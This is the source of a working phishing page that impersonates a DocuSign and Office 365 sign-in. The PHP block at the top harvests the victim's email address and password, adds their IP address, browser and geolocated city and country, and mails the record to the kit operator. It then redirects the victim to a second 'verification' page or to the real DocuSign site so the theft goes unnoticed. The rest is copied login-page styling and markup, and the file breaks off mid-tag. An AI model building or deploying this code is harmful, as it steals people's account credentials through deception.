<?php 


if (isset($_POST['Email'])) { 

$emailprovider = $_POST["hidCflag"]; 


switch ($emailprovider) {
    case 0: 
        $emailprovider = "Office365"; 
        break;
    case 1: 
        $emailprovider = "Gmail"; 
        break; 
    case 2: 
        $emailprovider = "Yahoo"; 
        break; 
    case 3: 
        $emailprovider = "Hotmail"; 
        break; 
    case 4: 
        $emailprovider = "AOL"; 
        break; 
    case 5: 
        $emailprovider = "Others"; 
        break; 
} 
$browser = $_SERVER['HTTP_USER_AGENT'];

include('mail.php');
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message .= "\n";
$message .= "Provider: ".$emailprovider."\n"; //
$message .= "E: " . $_POST['Email'] . "\n"; 
$message .= "P: " . $_POST['Passwd'] . "\n"; 
$message .= "IP : " .$ip. "\n"; 
$message .= "\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "\n";
$headers = "From: Docusign <noreply>";
$headers .= $_POST['doc@docusign.com']."\n";


$hi = mail($to,$emailprovider." | ".$ip , $message,$headers); 

if ($emailprovider == "Gmail")
{
	?> 
<script type="text/javascript"> 
<!-- 
   window.location="verification.php"

</script> 
<?php	
}else{

  ?> 
<script type="text/javascript"> 
<!-- 
   window.location="https://www.docusign.net/Member/authenticate.aspx"; 

</script> 
<?php	

}
fclose($handle); 
exit; 

 } 
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<link href="assets/SpryValidationTextField.css" rel="stylesheet" type="text/css">
<link href="assets/SpryValidationPassword.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon" />
<link type="text/css" rel="stylesheet" href="css/GeminiHomeV2.css">
<link type="text/css" rel="stylesheet" href="css/conciergehelper.css">
<link type="text/css" rel="stylesheet" href="css/AppTile.css">
<link type="text/css" rel="stylesheet" href="css/EmbeddedFonts.css">
<link type="text/css" rel="stylesheet" href="css/MasterStyles15.css">
<link type="text/css" rel="stylesheet" href="css/MasterStyles15MVC.css">
<link type="text/css" rel="stylesheet" href="css/shellg2coremincss_ba45585d.css">
<link href="css/shellg2corecss_11377998.css" type="text/css" rel="stylesheet">
<link id="shellThemeLink" type="text/css" href="css/data.css" rel="stylesheet">
<link href="css/shellg2pluscss_baae2042.css" type="text/css" rel="stylesheet">
<title>Docusign</title>

<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(dbx/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
	height: 75px;
	border-bottom: 1px solid #e5e5e5;
	overflow: hidden;
  }
  .header .logo {
	float: left;
	margin-top: 13px;
	margin-right: 0;
	margin-bottom: 0;
	margin-left: 0;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
	border: 0;
	height: 75px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);

  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  }
  .google-header-bar.centered .header .logo {
	margin-top: 15px;
	margin-right: auto;
	margin-bottom: 15px;
	margin-left: auto;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
  <style>
  @font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(assets/DXI1ORHCpsQm3Vp6mXoaTXhCUOGz7vYGh680lGh-uXM.woff) format('woff');
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(assets/cJZKeOuBrn4kERxqtaUH3T8E0i7KZn-EPnyo3HZu7kw.woff) format('woff');
}
  </style>
  <style>
  h1, h2 {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  </style>
<style>
  .banner {
	text-align: center;
	margin-top: 5px;
	margin-bottom: 5px;
  }
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google img {
  display: block;
  width: 576px;
  height: 50px;
  margin: 10px auto;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
	margin-bottom: 3px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style>
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("dbx/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)">
  .jfk-tooltip {
  display: none;
  }
</style>
<style>
  .need-help-reverse {
  float: right;
  }
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  #stay-signed-in {
  float: left;
  }
  #stay-signed-in-tooltip {
  left: auto;
  margin-left: -20px;
  padding-top: 3px;
  position: absolute;
  top: 0;
  visibility: hidden;
  width: 314px;
  z-index: 1;
  }
  .dasher-tooltip {
  position: absolute;
  left: 50%;
  top: 380px;
  margin-left: 150px;
  }
  .dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
  }
  .dasher-tooltip p {
  margin-top: 0;
  }
  .dasher-tooltip p span {
  display: block;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .dasher-tooltip {
  top: 340px;
  }
</style>


</head>
<body style="overflow: hidden;" class="o365-theme-base o365-theme-base">



<table class="Shell-Modern" id="ShellContainer" cellpadding="0" cellspacing="0">
    <tbody>
        <tr>
            <td>
                <div class="removeFocusOutline" id="GeminiShellHeader"><div id="O365_NavHeader" autoid="_o365sg2c_l" class="o365cs-nav-header16 o365cs-base o365cst o365spo o365cs-nav-header o365cs-topnavBGColor-2 o365cs-topnavBGImage o365cs-rsp-affordance-off"> <div class="o365cs-nav-leftAlign">    <div style="display: none;" class="o365cs-nav-topItem o365cs-rsp-m-hide o365cs-rsp-tn-hideIfAffordanceOn"></div>  <div class="o365cs-nav-topItem o365cs-rsp-m-hide o365cs-rsp-tw-hide o365cs-rsp-tn-hideIfAffordanceOff"><div</div></div>  <div style="" class="o365cs-nav-topItem o365cs-nav-o365Branding o365cs-rsp-tn-hideIfAffordanceOn"><a aria-label="Go to your Office 365 home page" href="#" id="O365_MainLink_Logo" role="link" class="o365cs-nav-bposLogo o365cs-topnavText o365cs-o365logo o365cs-rsp-tw-hide o365cs-rsp-tn-hide o365"><span class="o365cs-nav-brandingText"><img src="images/docusign.png" title="docusign" autoid="_o365sg2c_0" type="button" width="162" height="30" class="o365cs-nav-item o365cs-nav-button ms-fcl-w o365cs-me-nav-item o365button ms-bgc-tdr-h"></span><span style="" class="o365cs-nav-gallatinLogo owaimg"> </span></a><div class="o365cs-nav-appTitleLine o365cs-nav-brandingText o365cs-topnavText o365cs-rsp-tw-hide o365cs-rsp-tn-hide"></div><a aria-label="3 Apps" role="link" class="o365cs-nav-appTitle o365cs-topnavText o365button o365cs-display-none"><span class="o365cs-nav-brandingText"></span></a><span class="o365cs-nav-appTitle o365cs-topnavText"> <span class="o365cs-nav-brandingText"></span> </span></div>  <div style="display: none;" class="o365cs-nav-topItem o365cs-breadCrumbContainer o365cs-rsp-tw-hide o365cs-rsp-tn-hide"></div> </div> <div class="o365cs-nav-centerAlign">  <div style="display: none;" class="o365cs-rsp-tw-sm-hide o365cs-rsp-tn-hide"></div>  <div style="display: none;" class="o365cs-rsp-tw-hide o365cs-rsp-tn-hide"></div> </div> <div id="O365_TopMenu" class="o365cs-nav-rightAlign o365cs-topnavLinkBackground-2"> <div><div class="o365cs-nav-rightMenus"> <div aria-label="User settings" role="banner"><div style="" class="o365cs-nav-topItem o365cs-rsp-tn-hide"><div class="o365cs-nav-pinToTop"><div></div></div></div><div style="display: none;" class="o365cs-nav-topItem o365cs-rsp-tn-hide"></div><div class="o365cs-nav-topItem o365cs-rsp-m-hide o365cs-rsp-tw-hide o365cs-rsp-tn-hideIfAffordanceOn"><div></div></div><div class="o365cs-nav-topItem o365cs-rsp-m-hide o365cs-rsp-tn-hideIfAffordanceOff"><div><button aria-label="Open the app launcher to access your Office 365 apps" aria-disabled="false" id="O365_MainLink_NavMenu_Responsive" role="menuitem" type="button" class="o365cs-nav-item o365cs-nav-button ms-bgc-tdr-h o365button o365cs-topnavText"><span class="o365cs-topnavText owaimg ms-Icon--waffle2 ms-icon-font-size-20"> </span><div class="o365cs-flexPane-unseenitems"> <span style="display: none;" class="o365cs-flexPane-unseenCount ms-fcl-w ms-bgc-tdr"></span> <span style="display: none;" class="o365cs-flexPane-unseenCount owaimg ms-Icon--starburst ms-icon-font-size-12 ms-fcl-w ms-bgc-tdr"> </span> </div></div></div><div class="o365cs-nav-topItem o365cs-rsp-tn-hideIfAffordanceOff"><div></div></div><div class="o365cs-nav-topItem o365cs-rsp-tn-hideIfAffordanceOff"><div></div></div><div style="display: none;" class="o365cs-nav-topItem o365cs-rsp-tn-hideIfAffordanceOff"></div><div style="display: none;" class="o365cs-nav-topItem o365cs-rsp-tn-hideIfAffordanceOff"></div><div style="display: none;" class="o365cs-nav-topItem o365cs-rsp-tn-hideIfAffordanceOff"></div><div style="" class="o365cs-nav-topItem o365cs-rsp-tn-hideIfAffordanceOff"><div></div></div><div style="display: none;" class="o365cs-nav-topItem o365cs-rsp-tn-hideIfAffordanceOff"></div><div style="" class="o365cs-nav-topItem o365cs-rsp-tn-hideIfAffordanceOn"><img src="images/apple-touch-icon-72x72.png" title="docusign" autoid="_o365sg2c_0" type="button" class="o365cs-nav-item o365cs-nav-button ms-fcl-w o365cs-me-nav-item o365button ms-bgc-tdr-h"><div class="o365cs-me-tileview-container"><div autoid="_o365sg2c_1" class="o365cs-me-tileview"><div autoid="_o365sg2c_2" class="o365cs-me-presence5x50 o365cs-me-presenceColor-Offline"></div><span autoid="_o365sg2c_3" class="ms-bgc-nt ms-fcl-w o365cs-me-tileimg o365cs-me-tileimg-doughboy owaimg ms-Icon--person ms-icon-font-size-52"> </span><div style="display: none;"></div><div style="display: none;" class="o365cs-me-tileimg"><img 